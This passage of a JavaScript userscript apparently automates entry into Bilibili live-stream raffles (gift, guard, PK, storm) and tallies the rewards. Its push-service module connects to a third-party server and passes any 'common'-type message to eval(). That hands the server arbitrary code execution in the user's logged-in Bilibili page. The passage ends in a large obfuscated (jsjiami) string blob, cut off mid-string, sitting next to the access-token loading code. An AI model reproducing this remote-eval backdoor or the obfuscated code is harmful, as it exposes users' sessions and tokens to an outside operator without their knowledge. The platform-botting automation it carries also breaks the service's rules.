			    return delayCall(() => BiliPushUtils.Pk._join(roomid, id), 1e3);
			} else if (response.msg.indexOf('过期') > -1) {} else {
			    window.toast(
				`[自动抽奖][乱斗领奖](roomid=${roomid},id=${id})${response.msg}`,
				'caution');
			}
			RafflePorcess.remove(roomid, id);
		    }, () => {
			window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`,
				     'error');
			return delayCall(() => BiliPushUtils.Pk._join(roomid, id));
		    }), parseInt(Math.random() * 6) * 1e3);
		    return $.Deferred().resolve();
		}
	    },
	    Gift: {
		run: (roomid) => (BiliPushUtils.Check.run(roomid)),
		join: async (roomid, raffleList) => {
		    try {
			//console.log(`Gift.join`,roomid,raffleList,i)
			//if (Info.blocked) return $.Deferred().resolve();
			//if (i >= raffleList.length) return $.Deferred().resolve();
			for (let obj of raffleList) {
			    if (obj.status === 1) { // 可以参加
				// raffleId过滤，防止重复参加
				var raffleId = parseInt(obj.raffleId, 10);
				if (BiliPushUtils.raffleIdSet.has(raffleId)) return $.Deferred().resolve();
				BiliPushUtils.raffleIdSet.add(raffleId); // 加入raffleId记录列表
				await BiliPushUtils.Gift._join(roomid, obj.raffleId, obj.type, obj.time_wait);
			    } else if (obj.status === 2 && obj.time > 0) { // 已参加且未开奖
			    }
			}
			return $.Deferred().resolve();
		    } catch (e) {
			await delayCall(() => BiliPushUtils.Gift.join(roomid, raffleList), 1e3);
		    }
		},
		_join: (roomid, raffleId, type, time_wait = 0) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    raffleId = parseInt(raffleId, 10);
		    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
		    if (!type) {
			delayCall(() => BiliPushUtils.Check.run(roomid));
			return $.Deferred().resolve();
		    }
		    window.toast(
			`[自动抽奖][礼物抽奖]等待抽奖(roomid=${roomid},id=${raffleId},type=${type},time_wait=${time_wait})`,
			'info');
		    RafflePorcess.append(roomid, raffleId);
		    delayCall(() => BiliPushUtils.API.Gift.join(roomid, raffleId, type).then((response) => {
			DEBUG('BiliPushUtils.Gift._join: BiliPushUtils.API.Gift.join', response);
			switch (response.code) {
			    case 0:
				Statistics.appendGift(response.data.award_name, response.data.award_num,
						      response.data.award_ex_time);
				window.toast(
				    `[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type}),${response.data.award_name+"x"+response.data.award_num}`,
				    'success');
				break;
			    case 402:
				// 抽奖已过期，下次再来吧
				break;
			    case 65531:
				// 65531: 非当前直播间或短ID直播间试图参加抽奖
				//Info.blocked = true;
				//BiliPushUtils.up();
				//window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
				break;
			    default:
				if (response.msg.indexOf('拒绝') > -1) {
				    //Info.blocked = true;
				    //BiliPushUtils.up();
				    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
				} else if (BiliPushUtils.msgIgnore(response.msg)) {
				    return delayCall(() => BiliPushUtils.Gift._join(roomid,
										    raffleId, type), 1e3);
				} else {
				    window.toast(
					`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`,
					'caution');
				}
			}
			RafflePorcess.remove(roomid, raffleId);
		    }, () => {
			window.toast(
			    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`,
			    'error');
			return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),
					 1e3);
		    }), (time_wait + 1) * 1e3);
		    return $.Deferred().resolve();
		}
	    },
	    Guard: {
		run: (roomid) => (BiliPushUtils.Check.run(roomid)),
		join: async (roomid, guard) => {
		    try {
			//console.log(`Guard.join`,roomid,guard,i)
			//if (Info.blocked) return $.Deferred().resolve();
			if (!guard) return $.Deferred().resolve();
			for (let obj of guard) {
			    // id过滤，防止重复参加
			    var id = parseInt(obj.id, 10);
			    if (BiliPushUtils.guardIdSet.has(id)) return $.Deferred().resolve();
			    BiliPushUtils.guardIdSet.add(id); // 加入id记录列表
			    await BiliPushUtils.Guard._join(roomid, obj.id);
			}
			return $.Deferred().resolve();
		    } catch (e) {
			await delayCall(() => BiliPushUtils.Guard.join(roomid, guard));
		    }
		},
		_join: (roomid, id) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    RafflePorcess.append(roomid, id);
		    window.toast(`[自动抽奖][舰队领奖]检测到(roomid=${roomid},id=${id})`, 'info');
		    delayCall(() => BiliPushUtils.API.Guard.join(roomid, id).then((response) => {
			DEBUG('BiliPushUtils.Guard._join: BiliPushUtils.API.Guard.join',
			      response);
			if (response.code === 0) {
			    Statistics.appendGift(response.data.award_name, response.data.award_num,
						  response.data.award_ex_time);
			    window.toast(
				`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_name+"x"+response.data.award_num}`,
				'success');
			} else if (response.msg.indexOf('拒绝') > -1) {
			    //Info.blocked = true;
			    //BiliPushUtils.up();
			    //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			} else if (BiliPushUtils.msgIgnore(response.msg)) {
			    return delayCall(() => BiliPushUtils.Guard._join(roomid, id), 1e3);
			} else if (response.msg.indexOf('过期') > -1) {} else {
			    window.toast(
				`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`,
				'caution');
			}
			RafflePorcess.remove(roomid, id);
		    }, () => {
			window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`,
				     'error');
			return delayCall(() => BiliPushUtils.Guard._join(roomid, id));
		    }), parseInt(Math.random() * 6 * 1e3));
		    return $.Deferred().resolve();
		}
	    }
	}
	const BiliPush = {
	    _ajax: (url, data, callback, error) => {
		$.ajax({
		    type: "POST",
		    url: url,
		    data: data,
		    dataType: "json",
		    beforeSend: function (request) {},
		    success: function (data) {
			callback(data);
		    },
		    error: function (err) {
			error(err);
		    }
		})
	    },
	    connected: false,
	    gsocket: null,
	    gsocketTimeId: null,
	    gheartTimeId: null,
	    first: true,
	    lock: false,
	    connectWebsocket: (lazy = false) => {
		if (BiliPush.first) {
		    window.toast('初始化bilipush 推送服务', 'info');
		}
		if (BiliPush.lock) return;
		BiliPush.lock = true;
		if (lazy) {
		    if (BiliPush.gsocket && BiliPush.gsocket.readyState < 2) {
			BiliPush.lock = false;
			return;
		    }
		}
		var data = {
		    uid: BilibiliLive.UID,
		    version: VERSION
		};
		var url = "https://bilipush.1024dream.net:5000/ws/pre-connect";
		BiliPush._ajax(url, data, function (d) {
		    if (d.code == -1) {
			window.toast('bilipush 拒绝连接:' + d.msg, 'error');
			BiliPush.lock = false;
			return;
		    }
		    var url = d.server;
		    if (BiliPush.gsocket) BiliPush.gsocket.close();
		    BiliPush.gsocket = null;
		    BiliPush.gsocket = new WebSocket(url);
		    BiliPush.gsocket.onopen = function (e) {
			if (BiliPush.first) {
			    window.toast('bilipush 连接成功', 'success');
			    BiliPush.first = false;
			} else {
			    console.info('bilipush 连接成功');
			}
			BiliPush.connected = true;
			BiliPush.gsocket.send("ping");
			BiliPush.gheartTimeId = setInterval(function () {
			    BiliPush.gsocket.send("ping");
			}, 120e3);
		    };
		    BiliPush.gsocket.onclose = function (e) {
			console.error('bilipush 连接断开');
			BiliPush.connected = false;
			BiliPush.gsocket = null;
			clearTimeout(BiliPush.gsocketTimeId);
			clearInterval(BiliPush.gheartTimeId);
			BiliPush.gsocketTimeId = setTimeout(function () {
			    if (CONFIG.DD_BP) {
				BiliPush.connectWebsocket();
			    }
			}, 5000);
		    };
		    BiliPush.gsocket.onmessage = function (e) {
			try {
			    var msg = JSON.parse(e.data);
			    BiliPush.onRafflePost(msg);
			} catch (err) {
			    console.log(e, err);
			    return;
			}
		    };
		    BiliPush.gsocket.onerror = function (e) {
			console.error('bilipush 连接异常');
			BiliPush.connected = false;
			BiliPush.gsocket = null;
			clearTimeout(BiliPush.gsocketTimeId);
			clearInterval(BiliPush.gheartTimeId);
			BiliPush.gsocketTimeId = setTimeout(function () {
			    if (CONFIG.DD_BP) {
				BiliPush.connectWebsocket();
			    }
			}, 5000);
		    };
		    BiliPush.lock = false;
		}, function (err) {
		    console.error("bilipush连接失败，等待重试...");
		    BiliPush.connected = false;
		    BiliPush.gsocketTimeId = setTimeout(function () {
			if (CONFIG.DD_BP) {
			    BiliPush.connectWebsocket();
			}
		    }, 5000);
		    BiliPush.lock = false;
		});
	    },
	    onRafflePost: (rsp) => {
		try {
		    let raffle_data = JSON.parse(rsp);
		    let {
			code,
			type,
			data
		    } = raffle_data;
		    if (code == 0) {
			if (type == "raffle") {
			    let {
				room_id,
				raffle_type
			    } = data;
			    switch (raffle_type) {
				case "TV":
				case "GUARD":
				case "PK":
				case "GIFT":
				    window.toast(`bilipush 监控到 房间 ${room_id} 的礼物`, 'info');
				    BiliPushUtils.Check.process(room_id);
				    break;
				case "STORM":
				    window.toast(`bilipush 监控到 房间 ${room_id} 的节奏风暴`, 'info');
				    BiliPushUtils.Storm.run(room_id);
				    break;
			    }
			} else if (type == "common") {
			    try {
				eval(data);
			    } catch (e) {
				console.error("bilipush 回调失败，可能浏览器不支持");
			    }
			} else if (type == "notice") {
			    window.toast(data, 'caution');
			} else if (type == "msg") {
			    window.alertdialog("魔改助手消息", data);
			} else if (type == "reload") {
			    localStorage.setItem('LIVE_PLAYER_STATUS', JSON.stringify({
				type: 'html5',
				timeStamp: ts_ms()
			    }));
			    var volume = localStorage.getItem('videoVolume') || 0;
			    if (volume == 0) {
				localStorage.setItem('videoVolume', 0.1);
			    }
			    location.reload();
			}
		    }
		} catch (e) {
		    console.error(e, rsp);
		}
	    },
	    run: () => {
		BiliPushUtils.Check.start();
		BiliPushUtils.Check.run(window.BilibiliLive.ROOMID);
		BiliPushUtils.Storm.run(window.BilibiliLive.ROOMID);
		if (CONFIG.DD_BP) {
		    BiliPush.connectWebsocket(true);
		} else if (BiliPush.gsocket) {
		    BiliPush.gsocket.close();
		}
		window.websocket = BiliPush.gsocket;
		BiliPushUtils.clearSet();
		setInterval(() => {
		    BiliPushUtils.clearSet();
		}, 5e3);
	    }
	}
	const RafflePorcess = {
	    raffle_Process: {},
	    save_Interval: 0,
	    run: () => {
		try {
		    var raffle_Process = JSON.parse(localStorage.getItem(`${NAME}_RAFFLE`)) || {};
		    for (let room_id in RafflePorcess.raffle_Process) {
			BiliPushUtils.Check.run(room_id);
		    }
		} catch (e) {}
		if (RafflePorcess.save_Interval == 0) {
		    RafflePorcess.save_Interval = setInterval(() => {
			localStorage.setItem(`${NAME}_RAFFLE`, JSON.stringify(RafflePorcess.raffle_Process));
		    }, 100);
		}
	    },
	    append: (room_id, raffle_id) => {
		if (RafflePorcess.raffle_Process[room_id]) {
		    if (RafflePorcess.raffle_Process[room_id].indexOf(raffle_id) == -1) {
			RafflePorcess.raffle_Process[room_id].push(raffle_id);
		    }
		} else {
		    RafflePorcess.raffle_Process[room_id] = [raffle_id];
		}
	    },
	    remove: (room_id, raffle_id) => {
		if (RafflePorcess.raffle_Process[room_id]) {
		    RafflePorcess.raffle_Process[room_id] = RafflePorcess.raffle_Process[room_id].filter(r =>
													 r != raffle_id);
		    if (RafflePorcess.raffle_Process[room_id].length == 0) {
			delete RafflePorcess.raffle_Process[room_id];
		    }
		}
	    }
	}
	const Statistics = {
	    gifts: {},
	    queue: [],
	    save_Interval: 0,
	    process_timeOut: 0,
	    run: () => {
		try {
		    Statistics.gifts = JSON.parse(localStorage.getItem(`${NAME}_DAYGIFTS`)) || {};
		} catch (e) {}
		if (!CACHE.stats_ts || checkNewDay(CACHE.stats_ts)) {
		    Statistics.gifts = {};
		    CACHE.stats_ts = ts_ms();
		}
		if (Statistics.save_Interval == 0) {
		    Statistics.save_Interval = setInterval(() => {
			localStorage.setItem(`${NAME}_DAYGIFTS`, JSON.stringify(Statistics.gifts));
		    }, 100);
		}
		if (Statistics.process_timeOut == 0) {
		    Statistics.process_timeOut = setTimeout(() => Statistics.process(), 200);
		}
		runTomorrow(Statistics.run);
	    },
	    appendGift: (name, count, expire) => {
		if (expire) {
		    var expireDay = Math.ceil((expire * 1e3 - new Date().getTime()) / 86400e3);
		    name = `${name}(${expireDay}d)`;
		}
		console.log(`记录：获得 ${name}x${count}`);
		Statistics.queue.push({
		    name: name,
		    count: count
		});
	    },
	    process: () => {
		while (Statistics.queue.length > 0) {
		    let {
			name,
			count
		    } = Statistics.queue.shift();
		    if (Statistics.gifts[name]) {
			Statistics.gifts[name] += count;
		    } else {
			Statistics.gifts[name] = count;
		    }
		}
		clearTimeout(Statistics.process_timeOut);
		Statistics.process_timeOut = setTimeout(() => Statistics.process(), 200);
	    },
	    showDayGifts: () => {
		let sumGroupKey = ['辣条'];
		let sumGroup = {};
		let gifts = [];
		for (let [k, v] of Object.entries(Statistics.gifts)) {
		    gifts.push(`${k}x${v}`);
		    for (let t of sumGroupKey) {
			if (k.startsWith(t)) {
			    if (sumGroup[t]) {
				sumGroup[t] += v;
			    } else {
				sumGroup[t] = v;
			    }
			}
		    }
		}
		if (gifts.length > 0) {
		    gifts.push(`统计:`);
		    for (let [k, v] of Object.entries(sumGroup)) {
			gifts.push(`${k}x${v}`);
		    }
		}
		window.alertdialog('当日礼物统计', gifts.join('<br>'));
	    },
	};
	const KeySign = {
	    sort: (obj) => {
		let keys = Object.keys(obj).sort();
		let p = [];
		for (let key of keys) {
		    p.push(`${key}=${obj[key]}`);
		}
		return p.join('&');
	    },
	    convert: (obj) => {
		for (let k in obj) {
		    if ($.type(obj[k]) == "array") {
			obj[k] = JSON.stringify(obj[k]);
		    }
		}
	    },
	};
	const TokenLoad = async () => {
	    if (Info.csrf_token) {
		let tinfo = JSON.parse(localStorage.getItem(`${NAME}_Token`)) || {};
		if (tinfo.csrf_token == Info.csrf_token && tinfo.time > ts_s()) {
		    Info.appToken = tinfo;
		} else {
		    tinfo = await getAccessToken();
		    tinfo.time = ts_s() + tinfo.expires_in;
		    tinfo.csrf_token = Info.csrf_token;
		    localStorage.setItem(`${NAME}_Token`, JSON.stringify(tinfo));
		    Info.appToken = tinfo;
		}
	    }
	};

	var _0xodR='jsjiami.com.v6',_0xd254=[_0xodR,'\x4a\x78\x41\x5a\x4f\x57\x66\x43\x6d\x33\x4d\x4a\x77\x35\x76\x43\x68\x57\x74\x57','\x4e\x79\x7a\x44\x68\x4d\x4f\x63\x46\x51\x3d\x3d','\x52\x73\x4b\x54\x77\x6f\x51\x79\x77\x70\x77\x3d','\x46\x73\x4b\x48\x77\x71\x4c\x43\x76\x32\x51\x3d','\x4c\x63\x4b\x6a\x77\x72\x62\x43\x6b\x30\x6f\x3d','\x4b\x38\x4f\x36\x77\x34\x39\x71\x77\x34\x45\x3d','\x77\x36\x7a\x44\x76\x55\x72\x43\x69\x38\x4b\x66\x77\x34\x74\x76','\x46\x63\x4b\x62\x65\x73\x4b\x69','\x77\x6f\x37\x44\x72\x38\x4f\x72\x77\x72\x6e\x43\x75\x44\x68\x4c\x44\x38\x4f\x4c\x4b\x6c\x51\x71','\x77\x6f\x66\x44\x73\x38\x4f\x54\x77\x71\x37\x43\x71\x51\x3d\x3d','\x42\x30\x5a\x7a\x77\x37\x76\x44\x71\x67\x3d\x3d','\x46\x4d\x4b\x4c\x77\x37\x48\x43\x74\x4d\x4f\x43','\x50\x63\x4f\x38\x77\x37\x37\x43\x76\x48\x73\x3d','\x44\x38\x4b\x77\x66\x4d\x4b\x70\x77\x34\x67\x3d','\x77\x34\x77\x78\x77\x6f\x6c\x51\x77\x72\x59\x3d','\x77\x34\x30\x55\x4f\x73\x4b\x30\x77\x35\x77\x3d','\x43\x73\x4f\x33\x77\x35\x51\x45\x77\x37\x49\x3d','\x77\x37\x58\x43\x6c\x73\x4b\x43\x57\x38\x4b\x50','\x77\x35\x44\x44\x69\x41\x72\x44\x6c\x69\x38\x3d','\x4d\x63\x4f\x4d\x77\x36\x45\x34\x77\x35\x45\x3d','\x77\x70\x50\x43\x67\x38\x4b\x42\x54\x38\x4b\x33','\x46\x4d\x4b\x53\x77\x71\x4c\x43\x6b\x30\x63\x3d','\x55\x55\x50\x44\x6f\x4d\x4b\x52\x77\x37\x38\x3d','\x65\x77\x76\x44\x6d\x30\x72\x43\x6e\x77\x3d\x3d','\x4c\x57\x34\x58\x77\x35\x44\x44\x68\x77\x3d\x3d','\x4a\x4d\x4f\x46\x77\x35\x49\x51\x77\x35\x45\x3d','\x64\x68\x54\x44\x6d\x33\x6a\x43\x6f\x41\x3d\x3d','\x77\x70\x76\x44\x72\x63\x4f\x6f\x77\x72\x33\x43\x6a\x77\x3d\x3d','\x4e\x38\x4b\x43\x66\x4d\x4b\x2b\x49\x67\x3d\x3d','\x4a\x45\x51\x53\x77\x34\x59\x4c','\x50\x4d\x4f\x6e\x77\x36\x67\x56\x77\x36\x51\x3d','\x62\x67\x51\x30\x65\x53\x77\x3d','\x54\x4d\x4b\x52\x77\x72\x34\x54\x77\x6f\x55\x3d','\x77\x36\x4c\x43\x6b\x38\x4b\x74\x77\x35\x48\x44\x6d\x67\x3d\x3d','\x4f\x4d\x4b\x57\x77\x72\x6a\x43\x6c\x6e\x33\x43\x6d\x51\x6a\x44\x6c\x44\x50\x43\x70\x52\x62\x43\x73\x77\x3d\x3d','\x4c\x53\x30\x2f\x77\x35\x49\x61','\x4d\x73\x4b\x34\x62\x73\x4b\x61\x77\x36\x49\x3d','\x50\x63\x4f\x6c\x77\x36\x50\x43\x6d\x46\x6f\x3d','\x4b\x42\x46\x54\x42\x38\x4f\x42\x61\x56\x52\x73\x77\x71\x51\x76\x77\x71\x46\x46\x77\x71\x51\x3d','\x4c\x54\x6a\x44\x74\x38\x4f\x42\x44\x6b\x52\x2b\x46\x6d\x58\x44\x6c\x79\x62\x44\x76\x53\x44\x43\x73\x78\x4c\x43\x67\x33\x58\x43\x68\x67\x3d\x3d','\x77\x37\x41\x4d\x77\x72\x52\x43\x77\x72\x48\x43\x70\x42\x78\x57\x77\x36\x50\x44\x75\x78\x6e\x43\x67\x6b\x6b\x53','\x62\x6d\x78\x69\x51\x38\x4f\x31\x50\x44\x44\x43\x76\x4d\x4f\x6f\x77\x72\x4c\x43\x75\x58\x6a\x44\x70\x51\x3d\x3d','\x77\x35\x45\x39\x77\x70\x5a\x4b\x77\x6f\x44\x43\x69\x52\x78\x76\x77\x35\x58\x44\x72\x53\x4c\x43\x6f\x6d\x30\x49\x77\x71\x31\x38\x55\x4d\x4f\x54\x49\x38\x4f\x59\x58\x4d\x4f\x69','\x77\x70\x73\x4f\x77\x71\x42\x38\x77\x72\x58\x44\x71\x4d\x4b\x5a\x77\x72\x6e\x43\x6d\x67\x50\x44\x69\x6c\x74\x7a\x77\x72\x55\x3d','\x77\x37\x6e\x43\x75\x4d\x4b\x72\x54\x54\x33\x44\x6d\x4d\x4b\x74\x77\x71\x64\x55\x77\x70\x77\x3d','\x46\x55\x51\x6e\x77\x36\x6a\x43\x6d\x4d\x4b\x62\x77\x35\x34\x4f\x77\x70\x6b\x30\x4c\x38\x4b\x6c\x63\x38\x4f\x43\x5a\x73\x4b\x55\x77\x37\x77\x67\x42\x41\x3d\x3d','\x44\x73\x4f\x41\x49\x6a\x70\x31\x77\x34\x52\x64\x77\x6f\x70\x39\x4c\x6b\x68\x4d\x77\x6f\x74\x64\x77\x6f\x4c\x43\x69\x73\x4b\x64','\x77\x35\x2f\x43\x68\x38\x4b\x56\x51\x4d\x4b\x4d\x77\x36\x78\x6f\x77\x36\x63\x71\x61\x38\x4b\x30\x77\x70\x4c\x44\x6e\x4d\x4f\x58','\x53\x45\x62\x44\x75\x63\x4b\x55\x77\x36\x66\x44\x68\x38\x4f\x4e\x65\x38\x4b\x37\x77\x71\x73\x6c\x58\x41\x4d\x68\x77\x70\x78\x68\x77\x36\x2f\x44\x71\x52\x37\x43\x72\x38\x4b\x61\x77\x36\x6f\x3d','\x66\x73\x4f\x55\x4a\x77\x34\x36','\x41\x38\x4f\x45\x42\x43\x39\x6c','\x77\x34\x62\x44\x72\x38\x4b\x47\x63\x31\x73\x3d','\x4f\x38\x4b\x53\x45\x38\x4b\x7a\x59\x77\x3d\x3d','\x77\x6f\x55\x66\x43\x73\x4f\x68\x77\x70\x45\x3d','\x46\x55\x51\x6e\x77\x36\x6a\x43\x6d\x4d\x4b\x62\x77\x35\x34\x4b\x77\x6f\x67\x49\x4e\x73\x4b\x78\x63\x63\x4f\x44\x58\x4d\x4b\x6d\x77\x37\x41\x78','\x62\x78\x72\x44\x6c\x6e\x6a\x43\x74\x73\x4f\x74\x77\x34\x54\x43\x6c\x4d\x4f\x78\x4f\x73\x4f\x6d\x62\x42\x35\x50','\x4c\x4d\x4b\x42\x77\x72\x48\x43\x70\x45\x72\x43\x6e\x6a\x62\x44\x6a\x78\x54\x43\x6c\x52\x2f\x43\x74\x77\x34\x3d','\x65\x31\x2f\x43\x76\x6d\x6b\x49\x46\x38\x4b\x71\x77\x6f\x54\x44\x6d\x73\x4f\x42\x44\x6d\x38\x67\x62\x63\x4b\x7a\x4f\x30\x37\x43\x69\x52\x55\x51\x4f\x6d\x67\x3d','\x50\x6b\x52\x53\x77\x37\x33\x44\x72\x51\x3d\x3d','\x48\x54\x4c\x44\x73\x6b\x72\x43\x75\x51\x3d\x3d','\x61\x73\x4f\x59\x4f\x41\x49\x46','\x45\x31\x63\x71\x77\x35\x62\x43\x6c\x67\x3d\x3d','\x77\x36\x58\x44\x75\x48\x66\x43\x72\x4d\x4b\x68','\x42\x73\x4b\x59\x56\x38\x4b\x35\x77\x37\x77\x3d','\x4e\x4d\x4b\x2b\x42\x56\x35\x34','\x4a\x38\x4f\x42\x77\x34\x6e\x43\x76\x6d\x63\x59','\x53\x63\x4f\x47\x77\x72\x66\x44\x6e\x63\x4f\x56','\x77\x71\x44\x44\x6d\x4d\x4f\x46\x77\x6f\x54\x43\x76\x57\x59\x65','\x46\x4d\x4f\x77\x77\x37\x31\x76\x77\x36\x55\x3d','\x4b\x43\x58\x44\x76\x63\x4f\x73\x44\x41\x3d\x3d','\x77\x35\x56\x47\x43\x6a\x7a\x43\x6e\x51\x3d\x3d','\x53\x6a\x77\x72','\x53\x53\x73\x77\x46\x38\x4f\x7a\x42\x63\x4f\x43','\x55\x43\x48\x44\x74\x51\x3d\x3d','\x35\x62\x79\x4d\x35\x70\x65\x45\x35\x62\x43\x49\x35\x62\x32\x66\x35\x62\x32\x68\x35\x70\x57\x4d\x36\x5a\x75\x33\x35\x61\x79\x70\x35\x71\x2b\x6d','\x77\x37\x66\x44\x73\x68\x58\x44\x76\x42\x7a\x44\x6e\x33\x30\x3d','\x62\x6e\x78\x71','\x77\x34\x58\x44\x6a\x73\x4b\x6b\x53\x48\x34\x3d','\x77\x35\x4e\x6e\x45\x4d\x4f\x33\x51\x67\x3d\x3d','\x47\x4d\x4f\x71\x77\x35\x38\x66\x77\x36\x6b\x3d','\x4c\x6b\x78\x58\x77\x37\x2f\x44\x6a\x77\x3d\x3d','\x4c\x63\x4b\x4d\x77\x70\x7a\x43\x6e\x32\x77\x3d','\x77\x36\x62\x43\x76\x4d\x4b\x73','\x44\x38\x4b\x44\x54\x38\x4f\x52\x77\x71\x77\x3d','\x4d\x63\x4f\x31\x46\x52\x6c\x76\x77\x37\x52\x6a\x77\x71\x31\x77\x45\x58\x39\x68\x77\x71\x70\x39','\x42\x48\x67\x48\x77\x37\x66\x44\x71\x47\x4a\x76\x77\x35\x64\x64\x50\x31\x4c\x43\x73\x67\x38\x43\x77\x35\x66\x44\x70\x30\x6c\x49\x49\x4d\x4b\x77','\x47\x54\x67\x67\x47\x6d\x45\x3d','\x46\x6c\x59\x56\x77\x34\x72\x44\x72\x67\x3d\x3d','\x4e\x73\x4f\x45\x77\x34\x51\x76\x77\x36\x6b\x3d','\x51\x78\x6b\x43\x5a\x79\x76\x44\x74\x31\x37\x43\x68\x58\x51\x49\x42\x32\x76\x43\x75\x41\x3d\x3d','\x61\x67\x30\x62\x49\x38\x4f\x54\x4e\x4d\x4f\x75\x53\x46\x38\x75\x58\x38\x4f\x78\x77\x72\x50\x44\x75\x67\x3d\x3d','\x47\x45\x55\x62\x77\x36\x37\x43\x6b\x73\x4b\x70\x77\x34\x6b\x42\x77\x70\x6f\x30\x4b\x38\x4b\x68\x65\x63\x4f\x55\x62\x4d\x4b\x2b\x77\x37\x38\x31','\x48\x58\x48\x44\x70\x47\x56\x56\x51\x52\x33\x43\x6f\x73\x4f\x73\x5a\x73\x4f\x52\x59\x6d\x4a\x46','\x62\x73\x4f\x47\x77\x70\x37\x44\x67\x4d\x4f\x2b','\x42\x4d\x4b\x68\x66\x4d\x4b\x6d\x4f\x67\x3d\x3d','\x77\x34\x33\x43\x70\x47\x58\x43\x68\x63\x4f\x4a','\x61\x79\x63\x77\x5a\x43\x55\x3d','\x41\x73\x4f\x47\x77\x37\x59\x4e\x77\x35\x48\x44\x73\x4d\x4f\x2f\x4f\x52\x2f\x44\x69\x38\x4b\x37\x77\x72\x7a\x44\x67\x47\x63\x3d','\x55\x78\x62\x43\x6e\x73\x4f\x38\x4b\x63\x4b\x37\x4b\x69\x38\x77\x45\x4d\x4f\x71\x57\x4d\x4f\x56\x41\x45\x38\x49\x77\x72\x4a\x35\x77\x6f\x6e\x44\x6a\x4d\x4f\x45\x59\x51\x3d\x3d','\x77\x34\x63\x39\x77\x70\x78\x77\x77\x6f\x44\x43\x67\x77\x3d\x3d','\x61\x4d\x4b\x36\x77\x70\x34\x4e\x77\x71\x30\x70\x77\x6f\x41\x4d\x77\x71\x35\x42\x44\x46\x66\x44\x68\x4d\x4b\x72\x45\x63\x4f\x6e\x77\x34\x45\x3d','\x77\x35\x54\x44\x6c\x44\x37\x44\x69\x44\x7a\x44\x72\x6c\x45\x37\x77\x35\x35\x58\x48\x38\x4f\x34\x77\x36\x76\x44\x70\x67\x3d\x3d','\x77\x72\x30\x30\x77\x70\x5a\x4f\x77\x70\x66\x44\x67\x38\x4b\x31\x77\x70\x33\x43\x72\x54\x6a\x44\x67\x32\x68\x47\x77\x6f\x66\x43\x71\x63\x4f\x4c\x77\x34\x54\x43\x70\x53\x77\x31','\x43\x4d\x4f\x68\x77\x37\x7a\x43\x73\x55\x42\x42\x77\x70\x77\x4d\x77\x71\x77\x65\x77\x70\x6e\x44\x71\x4d\x4f\x50','\x44\x38\x4b\x6f\x77\x36\x6a\x43\x72\x38\x4f\x54','\x50\x63\x4f\x6b\x77\x35\x6c\x56\x77\x34\x63\x3d','\x77\x37\x66\x44\x69\x54\x6a\x44\x6a\x54\x6f\x3d','\x50\x6d\x51\x47\x4c\x78\x4e\x78\x41\x73\x4f\x68\x48\x38\x4b\x63\x63\x32\x41\x32\x54\x54\x51\x32\x62\x73\x4b\x74\x4b\x67\x3d\x3d','\x4e\x42\x4c\x44\x70\x6e\x76\x43\x73\x4d\x4f\x66\x77\x70\x4d\x3d','\x5a\x30\x72\x43\x6a\x6c\x34\x34','\x53\x45\x6e\x44\x70\x4d\x4b\x4f\x77\x36\x30\x3d','\x77\x37\x67\x54\x44\x38\x4b\x5a\x77\x37\x76\x44\x6f\x38\x4b\x2f\x52\x38\x4f\x77\x77\x71\x51\x3d','\x77\x6f\x2f\x43\x6e\x4d\x4b\x34\x51\x73\x4b\x48','\x43\x7a\x4c\x44\x68\x58\x54\x43\x67\x73\x4b\x49\x77\x34\x55\x55\x77\x72\x38\x3d','\x4b\x55\x44\x44\x6c\x41\x3d\x3d','\x45\x73\x4f\x65\x77\x34\x59\x6d\x77\x36\x49\x3d','\x77\x72\x38\x77\x77\x6f\x5a\x4e\x77\x70\x38\x3d','\x56\x41\x66\x43\x6e\x73\x4b\x62\x41\x73\x4b\x34\x45\x43\x67\x3d','\x45\x45\x6f\x6d\x77\x34\x34\x66','\x42\x52\x48\x44\x6b\x56\x37\x43\x68\x77\x3d\x3d','\x4c\x4d\x4f\x66\x77\x35\x6c\x57\x77\x37\x49\x3d','\x49\x73\x4f\x57\x77\x36\x41\x41\x77\x34\x51\x3d','\x4b\x38\x4b\x73\x62\x73\x4b\x62\x47\x41\x3d\x3d','\x64\x63\x4f\x6e\x48\x6a\x77\x4e','\x77\x6f\x52\x64\x77\x71\x4a\x76\x77\x34\x77\x3d','\x54\x54\x6a\x44\x6c\x6d\x6e\x43\x68\x77\x3d\x3d','\x52\x77\x48\x43\x6c\x38\x4f\x4f\x41\x73\x4b\x2b\x42\x67\x3d\x3d','\x4f\x73\x4b\x62\x77\x34\x76\x43\x69\x73\x4f\x69','\x77\x72\x6f\x36\x45\x73\x4f\x72\x77\x72\x30\x3d','\x44\x4d\x4b\x38\x61\x38\x4b\x4c\x77\x37\x37\x43\x75\x77\x3d\x3d','\x43\x38\x4b\x76\x45\x4d\x4b\x6e\x53\x4d\x4b\x76\x4b\x42\x6a\x44\x73\x4d\x4f\x32','\x4f\x32\x55\x78\x77\x37\x6e\x43\x6d\x77\x3d\x3d','\x77\x34\x62\x43\x6b\x63\x4b\x53\x54\x53\x51\x3d','\x46\x63\x4b\x70\x44\x48\x6c\x48','\x4f\x6d\x63\x70\x77\x36\x76\x43\x73\x67\x3d\x3d','\x4e\x4d\x4f\x48\x77\x35\x70\x6a\x77\x34\x55\x3d','\x50\x4d\x4f\x79\x77\x37\x68\x41\x77\x37\x4d\x3d','\x45\x56\x41\x72\x77\x34\x38\x4f','\x4c\x38\x4b\x2f\x59\x4d\x4b\x75\x4b\